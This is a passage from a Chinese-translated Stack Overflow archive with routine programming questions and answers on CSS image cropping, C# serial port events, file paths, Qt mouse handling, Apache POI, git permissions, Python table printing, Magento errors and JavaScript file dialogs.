[这篇文章](http://www.briangrinstead.com/blog/keep-aspect-ratio-with-html-and-css)解释了如何只使用 HTML 和 CSS 保持 div 始终为正方形。但它使用一些`position:absolute`来实现这一点。但这只是添加一个包装器的问题，`position:relative;`因此它的顶部/底部/左侧/右侧将尊重包装器而不是使用窗口的位置。

对于要在大于正方形时裁剪的图像，只需添加`overflow:hidden;`正方形 div，同时添加`max-width:100%;`图像，这样它将始终保持其自己的纵横比，同时永远不会被裁剪（宽度）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-25T13:15:41.860

1.  **将img**包装在**div**中。
2.  将**div** [`overflow-y`](https://developer.mozilla.org/en-US/docs/CSS/overflow-y)样式属性设置为`hidden`.
3.  根据您的喜好设置图像**宽度。**
4.  将**div**宽度设置为图像宽度。

* * *

**更新**

```
var imgs = document.getElementsByTagName('img') /* get all image elements */,
    i,
    div;

for (i = 0; i < imgs.length; i++) {
    div = document.createElement('div');
    // set the div overflow-y style property to hidden
    div.style.overflowY = 'hidden';
    // wrap the image in the div
    div.appendChild(imgs[i]);
    imgs[i].parentElement.replaceChild(div, imgs[i]);
    // set the image width to your liking
    imgs[i].style.width = YOUR_WIDTH + 'px'; // replace YOUR_WIDTH with whatever you want
    // set the div width to image width
    div.style.width = imgs[i].style.width;
} 
```

**注1**：我没有测试它，但它应该可以工作

**注意 2**：**Div**默认显示为**block** ，如果您希望它们内联显示，请考虑使用**span**或将 div`display`样式设置为。`inline`

# c# - 数据到来时C#只读串口

> ID：16215741
> 
> 赞同：8
> 
> 时间：2013-04-25T13:13:26.057
> 
> 标签：c#, serial-port, interrupt

我想读取我的串行端口，但只有在数据到来时（我不想轮询）。

我就是这样做的。

```
 Schnittstelle = new SerialPort("COM3");
                Schnittstelle.BaudRate = 115200;
                Schnittstelle.DataBits = 8;
                Schnittstelle.StopBits = StopBits.Two;
             .... 
```

然后我开始一个线程

```
 beginn = new Thread(readCom);
             beginn.Start(); 
```

在我的 readCom 中，我正在连续阅读（轮询 :( ）

```
private void readCom()
    {

        try
        {
            while (Schnittstelle.IsOpen)
            {

                Dispatcher.BeginInvoke(new Action(() =>
                {

                    ComWindow.txtbCom.Text = ComWindow.txtbCom.Text + Environment.NewLine + Schnittstelle.ReadExisting();
                    ComWindow.txtbCom.ScrollToEnd();
                }));

                beginn.Join(10);

            }
        }
        catch (ThreadAbortException) 
        {

        }

        catch (Exception ex)
        {
            System.Windows.Forms.MessageBox.Show(ex.ToString(), "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
        }
    } 
```

我希望你在中断到来时阅读。但我该怎么做呢？

* * *

## 回答 #1

> 赞同：36
> 
> 时间：2013-04-25T13:14:31.573

您必须将 eventHandler 添加到 DataReceived 事件。

以下是来自 msdn.microsoft.com 的示例，并进行了一些编辑：**请参阅评论**！：

```
public static void Main()
{
    SerialPort mySerialPort = new SerialPort("COM1");

    mySerialPort.BaudRate = 9600;
    mySerialPort.Parity = Parity.None;
    mySerialPort.StopBits = StopBits.One;
    mySerialPort.DataBits = 8;
    mySerialPort.Handshake = Handshake.None;

    mySerialPort.DataReceived += new SerialDataReceivedEventHandler(DataReceivedHandler);

    mySerialPort.Open();

    Console.WriteLine("Press any key to continue...");
    Console.WriteLine();
    Console.ReadKey();
    mySerialPort.Close();
}

private static void DataReceivedHandler(object sender, SerialDataReceivedEventArgs e)
{
    SerialPort sp = (SerialPort)sender;
    string indata = sp.ReadExisting();
    Debug.Print("Data Received:");
    Debug.Print(indata);
} 
```

每次数据进入时，DataReceivedHandler 都会触发并将您的数据打印到控制台。我认为你应该能够在你的代码中做到这一点。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-04-25T13:27:19.267

您需要在打开端口之前订阅 DataReceived 事件，然后在触发时监听该事件。

```
 private void OpenSerialPort()
    {
        try
        {
            m_serialPort.DataReceived += SerialPortDataReceived;
            m_serialPort.Open();
        }
        catch (Exception ex)
        {
            System.Diagnostics.Debug.WriteLine(ex.Message + ex.StackTrace);
        }
    } 

    private void SerialPortDataReceived(object sender, SerialDataReceivedEventArgs e)
    {
        var serialPort = (SerialPort)sender;
        var data = serialPort.ReadExisting();
        ProcessData(data);
    } 
```

串行，当缓冲区中有数据时，触发数据接收事件，这并不意味着您一次获得了所有数据。您可能需要等待多次才能获取所有数据；这是您需要单独处理接收到的数据的地方，也许在您进行最终处理之前将它们保存在某个地方的缓存中。

# c# - 在 C# 路径中使用变量

> ID：16215742
> 
> 赞同：2
> 
> 时间：2013-04-25T13:13:25.973
> 
> 标签：c#

我需要将 .xml 文件保存在计算机上的特定位置。但是位置可以根据用户的选择而改变。

我可以让用户选择（从组合框）到这样的变量：

```
location = (string)comboBox1.SelectedItem; 
```

但是由于“%location%”部分，我不能使用以下命令来存储我的文件。它说“找不到路径的一部分”

```
docSave.Save(@"C:\...\...\%location%\...\Information.xml"); 
```

谁能帮我解决这个问题……？

谢谢你。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-25T13:14:55.407

`String.Format`就是你要找的。

```
string.Format("C:\\...{0}\\Information.xml", location); 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-04-25T13:19:50.920

当您使用路径时，您应该始终使用`Path`该类，因此如果您想从多个部分获取工作路径，请使用[`Path.Combine`](http://msdn.microsoft.com/en-us/library/system.io.path.combine.aspx)：

```
string location = (string)comboBox1.SelectedItem;
string dir = "C:\dir1\dir2\%location%\dir4".Replace("%location%", location);
string filename = "Information.xml";
string fullPath = Path.Combine(dir, filename); 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-04-25T13:20:04.607

如果您尝试扩展已使用 % 分隔符键入的环境字符串，例如`%environmentVariableName%`，您可以使用[`Environment.ExpandEnvironmentVariables()`](http://msdn.microsoft.com/en-GB/library/system.environment.expandenvironmentvariables.aspx)

例如：

```
string expandedEnvString = Environment.ExpandEnvironmentVariables("%SystemRoot%\\Something"); 
```

这将适用于多个环境变量，只要每个环境变量都用`%`字符分隔，并且您可以将其他字符串与它们混合。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-04-25T13:14:57.460

您应该使用 string.format 将变量放在路径中：

```
docSave.Save(string.Format(@"C:......\{0}...\Information.xml", location)); 
```

# c++ - 触摸和非触摸设备上的 Qt 鼠标控制旋转

> ID：16215747
> 
> 赞同：3
> 
> 时间：2013-04-25T13:13:37.760
> 
> 标签：c++, qt, user-interface, touch

我已经在 Qt 中实现了旋转小部件。当用户点击旋转时，鼠标光标被隐藏，鼠标左/下拖动旋转旋转逆时针，鼠标右/上拖动旋转旋转顺时针。释放鼠标时，鼠标光标设置为单击的原始位置。像这样实现：

```
void RotaryWidget::mousePressEvent(QMouseEvent *MouseEvent)
{
    mMousePos = QCursor::pos();
    mPreviousPos = MouseEvent->pos();
    setCursor(Qt::BlankCursor);
}

void RotaryWidget::mouseReleaseEvent(QMouseEvent *MouseEvent)
{
    QCursor::setPos(mMousePos);
    unsetCursor();
}

void RotaryWidget::mouseMoveEvent(QMouseEvent *MouseEvent)
{
    QPoint DeltaPos = MouseEvent->pos() - mPreviousPos;
    // Use DeltaPos to move my rotary
    mPreviousPos = MouseEvent->pos();
} 
```

这样做的好处是，当连续有几个旋转器时，用户可以更快地进行调整。

上面的代码有一个错误，如果光标到达屏幕边缘，鼠标无法移动，因此旋转器不会移动。但是，用户看不到光标，所以这是个问题。我更改`mouseMoveEvent`以修复它：

```
void RotaryWidget::mouseMoveEvent(QMouseEvent *MouseEvent)
{
    if(MouseEvent->globalPos() == mMousePos)
    {
        mPreviousPos = mapFromGlobal(mMousePos);
        return;
    }
    else
    {
        QCursor::setPos(mMousePos);
    }
    QPoint DeltaPos = MouseEvent->pos() - mPreviousPos;
    // Use DeltaPos to move my rotary
    mPreviousPos = MouseEvent->pos();
} 
```

本质上，每次移动鼠标时，都会计算变化，然后将光标设置回原来的按下位置（因此它永远不会离开屏幕）。`if`顶部的 确保我们不会一遍又一遍地将鼠标位置设置为原始位置。

这在非触摸屏设备上工作正常，但在触摸屏设备`QCursor::setPos()`上不起作用，因为我无法以编程方式设置手指在屏幕上的位置！

我想不出一个能满足我所描述的所有要求的解决方案。如果有办法检测用户是否在使用触摸屏，它可以被修复，但我在 Qt 中找不到这样的功能。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T14:29:25.873

您可以检查鼠标是在边缘还是在边缘之外，而不是试图强制鼠标到点击位置，如果是，则使用 delta 的恒定增量（最后移动）：

```
void RotaryWidget::mouseMoveEvent(QMouseEvent *MouseEvent)
{
    QPoint DeltaPos;
    if(!isInsideWindow(MouseEvent))
    {
       DeltaPos = mPrevDeltaPos;
    }
    else
    {
       DeltaPos = MouseEvent->pos() - mPreviousPos;
       mPrevDeltaPos = DeltaPos;
       // Use DeltaPos to move my rotary
       mPreviousPos = MouseEvent->pos();
     }
} 
```

**编辑：**

另一种选择是根据全局鼠标坐标而不是相对于窗口 0 的局部坐标计算 DeltaPos - 因为只有两个鼠标坐标之间的差异是感兴趣的，所以不需要将位置链接到窗口。在这种情况下，小部件将按预期在触摸屏和鼠标操作的屏幕上工作 - 无论光标相对于窗口框架如何定位，鼠标/手指的相同移动都会以相同的方式改变方向。

# java - 如何在java中进行excel的单元格迭代

> ID：16215750
> 
> 赞同：2
> 
> 时间：2013-04-25T13:13:44.207
> 
> 标签：java, apache-poi

我有一个 2 行 5 列的 excel。现在我手动输入代码以从第一行获取值。我怎样才能迭代这个过程？

下面是excel中第一行的代码。从第二行开始，我不知道该怎么做......我想逐行迭代。

```
Workbook workbook = Workbook.getWorkbook(new File(
                               "\\C:\\users\\a-4935\\Desktop\\DataPool_CA.xls"));
Sheet sheet = workbook.getSheet("Sheet1");
System.out.println("Reached to Sheet");
Cell a = sheet.getCell(2,1);
Cell b = sheet.getCell(3,1);
Cell c = sheet.getCell(4,1);
Cell d = sheet.getCell(5,1);
Cell e = sheet.getCell(6,1);
Cell f = sheet.getCell(7,1);
Cell g = sheet.getCell(8,1);
Cell h = sheet.getCell(9,1);
Cell i = sheet.getCell(10,1);

String uId              =   a.getContents();
String deptFromDat      =   b.getContents();
String deptToDate       =   c.getContents();
String dept1            =   d.getContents();
String arrival1         =   e.getContents();
String eihon1           =   f.getContents();
String branchCode1      =   g.getContents();
String userType1        =   h.getContents();
String sessionId1       =   i.getContents(); 
```

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-04-25T13:19:16.550

使用下面的代码迭代数据表的所有行：

```
Sheet sheet = workbook.getSheet("Sheet1");
for (Row row : sheet) {
    for (Cell cell : row) {
        //your logic
    }
} 
```

或者，或者，使用以下代码：

```
Sheet sheet = workbook.getSheet("Sheet1");
for (int i = 0; i < 2; i++) {
    Row row = sheet.getRow(i);
    if(row == null) {
        //do something with an empty row
        continue;
    }
    for (int j = 0; j < 5; j++) {
        Cell cell = row.getCell(j);
        if(cell == null) {
            //do something with an empty cell
            continue;
        }
        //your logic
    }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-08-08T07:27:12.783

```
for (int i = 0; i <= sheet.getLastRowNum (); ++i) {
        row=(Row) sheet.getRow(i);
        Iterator<Cell> cells = row.cellIterator();
        while (cells.hasNext())
        { ..... 
```

您可以使用上面的代码来迭代所有行和所有单元格

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-25T13:19:46.330

您只需将 1 更改为行号，并使用 for 循环。根据您的代码，您可以执行以下操作，例如：

```
for(int i=0; i<number; i++)
{

            Cell a = sheet.getCell(2,i);
            Cell b = sheet.getCell(3,i);
            Cell c = sheet.getCell(4,i);
...

} 
```

或者更好地将 Cell 声明移出 for 循环，这是更好的做法。

```
Cell a,b, c...; 

for(int i=0; i<number; i++)
{

             a = sheet.getCell(2,i);
             b = sheet.getCell(3,i);
             c = sheet.getCell(4,i);
...

} 
```

# git - 具有 www-data 权限的 Git 拉取

> ID：16215755
> 
> 赞同：4
> 
> 时间：2013-04-25T13:13:55.397
> 
> 标签：git

我有一个 git 存储库，其中包含开发、测试和暂存分支，这些分支被拉到服务器上的虚拟主机上。我需要能够使用我的用户帐户在服务器上进行 git pull，但对于被拉取的文件归 www-data 用户（和组）所有。当我使用 svn 时，我可以 sudo as www-data 和 svn update 使用 --username --password 选项，这将作为我的用户对 svn 进行身份验证，但保持正确的文件所有权。有没有办法用 git 来做到这一点（我实际上使用 ssh 密钥而不是密码进行身份验证）。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-25T13:23:54.877

您想在要拉入的存储库上设置此选项（从 中提取`git help config`）：

```
 core.sharedRepository
       When group (or true), the repository is made shareable between several
       users in a group (making sure all the files and objects are
       group-writable). When all (or world or everybody), the repository will
       be readable by all users, additionally to being group-shareable. When
       umask (or false), git will use permissions reported by umask(2). When
       0xxx, where 0xxx is an octal number, files in the repository will have
       this mode value.  0xxx will override user’s umask value (whereas the
       other options will only override requested parts of the user’s umask
       value). Examples: 0660 will make the repo read/write-able for the
       owner and group, but inaccessible to others (equivalent to group
       unless umask is e.g.  0022).  0640 is a repository that is
       group-readable but not group-writable. See git-init(1). False by
       default. 
```

要将此选项设置`cd`为需要具有正确组/模式的工作树或存储库（不是您要从中提取的原始存储库），然后运行`git config core.sharedRepository group`​​. 它不仅为存储库中的文件设置模式，还确保它们都归拥有存储库根的组所有。无论您是在存储库中本地工作还是从另一个存储库（例如通过`git://`协议）推送到它，该选项都会生效。

如果您已经在存储库中创建了具有错误所有者和/或模式的文件，而没有设置此选项，则您首先需要`cd`进入存储库并运行`chmod -R g+rw .`并`chgrp -R www-data .`使其进入一致状态。

# google-maps - 谷歌地图标记未显示在黑莓应用程序中

> ID：16215759
> 
> 赞同：1
> 
> 时间：2013-04-25T13:14:07.197
> 
> 标签：google-maps, blackberry

我编写了一个与此示例中的代码类似的 javascript 代码。

[https://developers.google.com/maps/documentation/javascript/examples/icon-simple](https://developers.google.com/maps/documentation/javascript/examples/icon-simple)

它应该渲染一个带有标记的谷歌地图。

它在所有浏览器上都能完美运行。

但是当我在黑莓浏览器中打开它时 - 虽然地图加载成功，但它没有显示任何标记。

你能帮忙吗？

有任何想法吗？

# python - 表格格式，打印出行名

> ID：16215764
> 
> 赞同：3
> 
> 时间：2013-04-25T13:14:17.230
> 
> 标签：python

我有一本要格式化成表格的字典：

```
band3 = \
{'channel1': [10564, 2112, 1922],
 'channel10': [10787, 2157, 1967],
 'channel11': [10812, 2162, 1972],
 'channel12': [10837, 2167, 1977],
 'channel2': [10589, 2117, 1927],
 'channel3': [10612, 2122, 1932],
 'channel4': [10637, 2127, 1937],
 'channel5': [10662, 2132, 1942],
 'channel6': [10687, 2137, 1947],
 'channel7': [10712, 2142, 1952],
 'channel8': [10737, 2147, 1957],
 'channel9': [10762, 2152, 1962]} 
```

我这样做是这样的：

```
table = [[], [], [], []]
# can't just sort the channel names because 'channel11' < 'channel2'
channel_numbers = []
for channel_name in band3.keys():
    if channel_name.startswith('channel'):
        channel_number = int(channel_name[7:])
        channel_numbers.append(channel_number)
    else:
        raise ValueError("channel name doesn't follow pattern")
channel_numbers.sort()

for channel_number in channel_numbers:
    channel_data = band2['channel%d' % channel_number]
    column =[
              'Channel %d' % channel_number,
               str(channel_data[0]),
               '%s/%s' % (channel_data[1], channel_data[2]),
               str(channel_data[3])
            ]
    cell_widths = map(len, column) #9 5 2 9
    column_widths = max(cell_widths) # 9 or 10
    for i in range(len(cell_widths)): #4
        cell = column[i]
        padded_cell = cell + ' '*(column_widths-len(cell))
        table[i].append(padded_cell)
for line in table:
    print('  '.join(line)) 
```

这给出了：

```
Channel 1  Channel 2  Channel 3  Channel 4  Channel 5  Channel 6  Channel 7  Channel 8  Channel 9  Channel 10  Channel 11  Channel 12
10564      10589      10612      10637      10662      10687      10712      10737      10762      10787       10812       10837     
2112/1922  2117/1927  2122/1932  2127/1937  2132/1942  2137/1947  2142/1952  2147/1957  2152/1962  2157/1967   2162/1972   2167/1977 
20         0          0          26         32         0          26         0          0          0           0           15 
```

但是现在我想命名这些行：

```
 Channel 1  Channel 2  Channel 3  Channel 4  Channel 5  Channel 6  Channel 7  Channel 8  Channel 9  Channel 10  Channel 11  Channel 12
UARFCN 10564      10589      10612      10637      10662      10687      10712      10737      10762      10787       10812       10837     
DL/UL  2112/1922  2117/1927  2122/1932  2127/1937  2132/1942  2137/1947  2142/1952  2147/1957  2152/1962  2157/1967   2162/1972   2167/1977 
RSSI   20         0          0          26         32         0          26         0          0          0           0           15 
```

这相当容易，我将打印循环更改为：

```
print "      ",
print('  '.join(table[0])) 
print "UARFCN",
print('  '.join(table[1])) 
print "DL/UL ",
print('  '.join(table[2])) 
print "RSSI  ",
print('  '.join(table[3])) 
```

但是我想知道一些更好的方法来打印这些列名。我可以通过上面的填充计算变得冗长，但我想知道什么是一个干净、简单的方法。

编辑：格式尝试：

```
print('{0:6s}  {1}'.format("", ' '.join(table[0])))   
print('{0:2s}  {1}'.format("UARFCN", ' '.join(table[1])))   
print('{0:6s}  {1}'.format("DL/UL", ' '.join(table[2])))   
print('{0:6s}  {1}'.format("RSSI", ' '.join(table[3]))) 
```

编辑：另一种方式

```
print('{0} {1}'.format("".ljust(6), ' '.join(table[0])))   
print('{0} {1}'.format("UARFCN".ljust(6), ' '.join(table[1])))   
print('{0} {1}'.format("DL/UL".ljust(6), ' '.join(table[2])))   
print('{0} {1}'.format("RSSI".ljust(6), ' '.join(table[3]))) 
```

改进建议？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T16:27:18.800

与许多 python 任务一样，通过导入神奇的模块可以实现更优雅的代码。在这种情况下，该模块称为[prettytable](http://code.google.com/p/prettytable/wiki/Tutorial)。

这是一些工作代码：

```
from prettytable import PrettyTable

band3 = \
{'channel1': [10564, 2112, 1922],
 'channel10': [10787, 2157, 1967],
 'channel11': [10812, 2162, 1972],
 'channel12': [10837, 2167, 1977],
 'channel2': [10589, 2117, 1927],
 'channel3': [10612, 2122, 1932],
 'channel4': [10637, 2127, 1937],
 'channel5': [10662, 2132, 1942],
 'channel6': [10687, 2137, 1947],
 'channel7': [10712, 2142, 1952],
 'channel8': [10737, 2147, 1957],
 'channel9': [10762, 2152, 1962]}

band3_new = {}
for key in band3.keys():
    band3_new[ int( key.split('channel')[1] ) ] = band3[key]

x = PrettyTable()
x.add_column("", ["UARFCN", "DL/UL"])

for channel in band3_new.keys():
    x.add_column("channel " + str(channel), [band3_new[channel][0], str(band3_new[channel][1]) + "/" + str(band3_new[channel][2]) ] )

print x 
```

及其输出：

```
+--------+-----------+-----------+-----------+-----------+-----------+-----------+-----------+-----------+-----------+------------+------------+------------+
|        | channel 1 | channel 2 | channel 3 | channel 4 | channel 5 | channel 6 | channel 7 | channel 8 | channel 9 | channel 10 | channel 11 | channel 12 |
+--------+-----------+-----------+-----------+-----------+-----------+-----------+-----------+-----------+-----------+------------+------------+------------+
| UARFCN |   10564   |   10589   |   10612   |   10637   |   10662   |   10687   |   10712   |   10737   |   10762   |   10787    |   10812    |   10837    |
| DL/UL  | 2112/1922 | 2117/1927 | 2122/1932 | 2127/1937 | 2132/1942 | 2137/1947 | 2142/1952 | 2147/1957 | 2152/1962 | 2157/1967  | 2162/1972  | 2167/1977  |
+--------+-----------+-----------+-----------+-----------+-----------+-----------+-----------+-----------+-----------+------------+------------+------------+ 
```

不过，我无法弄清楚您从哪里获得 RSSI 行值。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-25T15:34:05.747

如果您不介意订单，我想这将有助于打印..：

```
band3 = \
{'channel1': [10564, 2112, 1922],
...
 'channel9': [10762, 2152, 1962]}

types = ['','UARFCN','DL/UL','RSSI']

# ASSUME THE DICTIONARY VALUES ARE EQUAL IN LENGTH
li1 = [types[0]]+band3.keys() # the stuff on the side
li2 = zip(types[1:],*band3.values()) # the main data
li3 = zip(li1,*li2)
for i,x in enumerate(li3):
    x = map(str, x)
    li3[i] = [a.ljust(b) for b in (max(map(len,x)),) for a in x]

final = zip(*li3)
for i in final:
    print ' '.join(i) 
```

输出：

```
 channel3 channel2 channel1 channel7 channel6 channel5 channel4 channel9 channel8 channel12 channel11 channel10
UARFCN 10612    10589    10564    10712    10687    10662    10637    10762    10737    10837     10812     10787    
DL/UL  2122     2117     2112     2142     2137     2132     2127     2152     2147     2167      2162      2157     
RSSI   1932     1927     1922     1952     1947     1942     1937     1962     1957     1977      1972      1967 
```

# javascript - 由于 JS 错误，Magento 无法在管理员中创建订单

> ID：16215770
> 
> 赞同：0
> 
> 时间：2013-04-25T13:14:36.700
> 
> 标签：javascript, magento, prototype

在 Magento 中，我们刚刚上线了一个新站点，无法在后端创建订单

单击“创建新订单”按钮后，您将进入客户列表，由于 JS 错误，您无法选择客户

```
Uncaught TypeError: Cannot call method 'select' of null configure.js:74
ProductConfigure._initWindowElements configure.js:74
ProductConfigure.initialize configure.js:57
klass prototype.js:101
(anonymous function) configure.js:764
_createResponder.responder

Uncaught TypeError: Cannot read property 'callback' of null sales.js:1214
OrderFormArea.initialize sales.js:1214
klass prototype.js:101
(anonymous function) sales.js:48
(anonymous function) prototype.js:391
_createResponder.responder 
```

该功能在测试站点上完美运行，两者之间的唯一区别是缓存，我尝试刷新等并没有解决问题

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-05-16T11:13:43.877

这最终归结为旧的 PHP 版本

旧服务器运行 PHP 5.2.17

升级到 5.4.15

发现它是新旧服务器之间唯一不同的地方

# javascript - 如何通过js打开选择文件对话框？

> ID：16215771
> 
> 赞同：88
> 
> 时间：2013-04-25T13:14:43.360
> 
> 标签：javascript, jquery, html

```
$('#id').click(); 
```

它不适用于 Mac OS 上的 Chrome 26。

问题实际上是创建可以集成在表单中的“上传”小部件。小部件将由两部分组成。第一部分是带有启动器按钮和错误/成功消息的 div。我认为方法是将另一个表单作为文件输入的第二部分并将文件提交到 iframe。提交后，我们在主表单的第一部分填写隐藏字段或显示错误。

简单的方法是将文件表单添加到主表单中，但这是被禁止的。

* * *

## 回答 #1

> 赞同：177
> 
> 时间：2013-04-25T13:22:40.230

## 使用 jQuery

我会创建一个按钮和一个不可见的输入，如下所示：

```
<button id="button">Open</button>
<input id="file-input" type="file" name="name" style="display: none;" /> 
```

并添加一些 jQuery 来触发它：

```
$('#button').on('click', function() {
    $('#file-input').trigger('click');
}); 
```

## 使用香草 JS

同样的想法，没有 jQuery（归功于[@Pascale](https://stackoverflow.com/questions/16215771/how-to-open-select-file-dialog-via-js/16215950#40597825)）：

```
<button onclick="document.getElementById('file-input').click();">Open</button>
<input id="file-input" type="file" name="name" style="display: none;" /> 
```

* * *

## 回答 #2

> 赞同：167
> 
> 时间：2016-12-05T10:18:05.350

## 仅 JS - 不需要 jquery

只需创建一个输入元素并触发点击。

```
var input = document.createElement('input');
input.type = 'file';
input.click(); 
```

这是最基本的，弹出一个选择文件对话框，但如果不处理所选文件，它就没有任何用处......

## 处理文件

向新创建的输入添加`onchange`事件将允许我们在用户选择文件后执行操作。

```
var input = document.createElement('input');
input.type = 'file';

input.onchange = e => { 
   var file = e.target.files[0]; 
}

input.click(); 
```

目前我们有存储各种信息的文件变量：

```
file.name // the file's name including extension
file.size // the size in bytes
file.type // file type ex. 'application/pdf' 
```

伟大的！

## 但是，如果我们需要文件的内容怎么办？

为了得到文件的实际内容，出于各种原因。放置图像，加载到画布中，使用 Base64 数据 url 创建一个窗口等。我们需要使用`FileReader`API

我们将创建 FileReader 的一个实例，并将我们用户选择的文件引用加载到它。

```
var input = document.createElement('input');
input.type = 'file';

input.onchange = e => { 

   // getting a hold of the file reference
   var file = e.target.files[0]; 

   // setting up the reader
   var reader = new FileReader();
   reader.readAsText(file,'UTF-8');

   // here we tell the reader what to do when it's done reading...
   reader.onload = readerEvent => {
      var content = readerEvent.target.result; // this is the content!
      console.log( content );
   }

}

input.click(); 
```

尝试将上述代码粘贴到您的开发工具的控制台窗口中，它应该会产生一个选择文件对话框，选择文件后，控制台现在应该打印文件的内容。

## 示例 - “Stackoverflow 的新背景图片！”

让我们尝试创建一个文件选择对话框来将 stackoverflows 背景图像更改为更辣的东西......

```
var input = document.createElement('input');
input.type = 'file';

input.onchange = e => { 

   // getting a hold of the file reference
   var file = e.target.files[0]; 

   // setting up the reader
   var reader = new FileReader();
   reader.readAsDataURL(file); // this is reading as data url

   // here we tell the reader what to do when it's done reading...
   reader.onload = readerEvent => {
      var content = readerEvent.target.result; // this is the content!
      document.querySelector('#content').style.backgroundImage = 'url('+ content +')';
   }

}

input.click(); 
```

打开 devtools，并将上面的代码粘贴到控制台窗口，这应该会弹出一个选择文件对话框，选择图像后，stackoverflows 内容框背景应该会更改为所选图像。

干杯!

* * *

## 回答 #3

> 赞同：19
> 
> 时间：2018-10-11T10:13:42.577

### 即用型功能（使用 Promise）

```
/**
 * Select file(s).
 * @param {String} contentType The content type of files you wish to select. For instance, use "image/*" to select all types of images.
 * @param {Boolean} multiple Indicates if the user can select multiple files.
 * @returns {Promise<File|File[]>} A promise of a file or array of files in case the multiple parameter is true.
 */
function selectFile(contentType, multiple){
    return new Promise(resolve => {
        let input = document.createElement('input');
        input.type = 'file';
        input.multiple = multiple;
        input.accept = contentType;

        input.onchange = () => {
            let files = Array.from(input.files);
            if (multiple)
                resolve(files);
            else
                resolve(files[0]);
        };

        input.click();
    });
} 
```

在这里试试

```
// Content wrapper element
let contentElement = document.getElementById("content");

// Button callback
async function onButtonClicked(){
    let files = await selectFile("image/*", true);
    contentElement.innerHTML = files.map(file => `<img src="${URL.createObjectURL(file)}" style="width: 100px; height: 100px;">`).join('');
}

// ---- function definition ----
function selectFile (contentType, multiple){
    return new Promise(resolve => {
        let input = document.createElement('input');
        input.type = 'file';
        input.multiple = multiple;
        input.accept = contentType;

        input.onchange = _ => {
            let files = Array.from(input.files);
            if (multiple)
                resolve(files);
            else
                resolve(files[0]);
        };

        input.click();
    });
}
```

```
<button onclick="onButtonClicked()">Select images</button>
<div id="content"></div>
```

* * *

## 回答 #4

> 赞同：13
> 
> 时间：2016-11-14T21:07:04.147

为了完整起见，[Ron van der Heijden](https://stackoverflow.com/a/16215950/4102617)在纯 JavaScript 中的解决方案：

```
<button onclick="document.querySelector('.inputFile').click();">Select File ...</button>
<input class="inputFile" type="file" style="display: none;"> 
```

* * *

## 回答 #5

> 赞同：11
> 
> 时间：2015-03-17T12:36:59.473

仅在 HTML 中：

```
<label>
  <input type="file" name="input-name" style="display: none;" />
  <span>Select file</span>
</label> 
```

**编辑：**我没有在 Blink 中测试过这个，它实际上不适用于 a `<button>`，但它应该适用于大多数其他元素——至少在最近的浏览器中。

用上面的代码检查[这个小提琴。](https://jsfiddle.net/nkx9son5/)

* * *

## 回答 #6

> 赞同：8
> 
> 时间：2018-05-06T12:13:44.953

要扩展“levi”的答案并展示如何从上传中获取响应，以便您可以处理文件上传：

```
selectFile(event) {
    event.preventDefault();

    file_input = document.createElement('input');
    file_input.addEventListener("change", uploadFile, false);
    file_input.type = 'file';
    file_input.click();
},

uploadFile() {
    let dataArray = new FormData();
    dataArray.append('file', file_input.files[0]);

    // Obviously, you can substitute with JQuery or whatever
    axios.post('/your_super_special_url', dataArray).then(function() {
        //
    });
} 
```

* * *

## 回答 #7

> 赞同：5
> 
> 时间：2020-07-09T15:21:38.137

```
function promptFile(contentType, multiple) {
  var input = document.createElement("input");
  input.type = "file";
  input.multiple = multiple;
  input.accept = contentType;
  return new Promise(function(resolve) {
    document.activeElement.onfocus = function() {
      document.activeElement.onfocus = null;
      setTimeout(resolve, 500);
    };
    input.onchange = function() {
      var files = Array.from(input.files);
      if (multiple)
        return resolve(files);
      resolve(files[0]);
    };
    input.click();
  });
}
function promptFilename() {
  promptFile().then(function(file) {
    document.querySelector("span").innerText = file && file.name || "no file selected";
  });
}
```

```
<button onclick="promptFilename()">Open</button>
<span></span>
```

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2018-12-17T18:26:51.497

***首先声明一个变量来存储文件名****（稍后使用它们）：*

```
var myfiles = []; 
```

***打开文件对话框***

```
$('#browseBtn').click(function() {
    $('<input type="file" multiple>').on('change', function () {
        myfiles = this.files; //save selected files to the array
        console.log(myfiles); //show them on console
    }).click();
}); 
```

我正在发布它，所以它可能会对某人有所帮助，因为互联网上没有关于如何将文件名存储到数组中的明确说明！

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2020-04-20T23:53:52.533

使用 jquery 库

```
<button onclick="$('.inputFile').click();">Select File ...</button>
<input class="inputFile" type="file" style="display: none;"> 
```

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2022-03-04T22:42:02.970

这个问题让我很困惑。添加 addeventlistener 调用了我不想要的事件。如果您对简单的选择器感兴趣，则不需要事件。输入/文件对话框将从单独的窗口返回到具有所选文件名的调用者（如果您查看调试器中的元素，“文件”对象还带有一些其他属性。感谢 user4602228 指路...

如下所示的简单输入/输出文件选择器 >>>

```
function loadsettings()
//
// use web page dialog to get user settings file
//
{
   var setload=parent.settings.document.createElement("input");
   setload.type="file";
   setload.click();
   settings(*setload.files[0]*,false,false); //these are custom parameters 
}
return; 
```

# javascript - 不同 Javascript 对象表示法的名称

> ID：16215781
> 
> 赞同：1
> 
> 时间：2013-04-25T13:14:57.827
> 
> 标签：javascript

是否有一个名称来描述您可以在 Javascript 中定义对象的不同方式？

有一种更“类”的方法：

```
function MyObject() {

    this.aMethod= new function(){
    };

    this.anotherMethod = new function(){
    };
} 
```

而另一种更“动态”的技术。

```
MyObject = new Object();
MyObject.aMethod= new function(){
};
MyObject.anotherMethod = new function(){
}; 
```

我一直在以各种方式使用这两种技术，并且我了解每种技术的好处，但是对于我的生活，在与同事讨论时，我不知道如何调用这两种技术。

这些技术有名字吗？

* * *

## 回答 #1

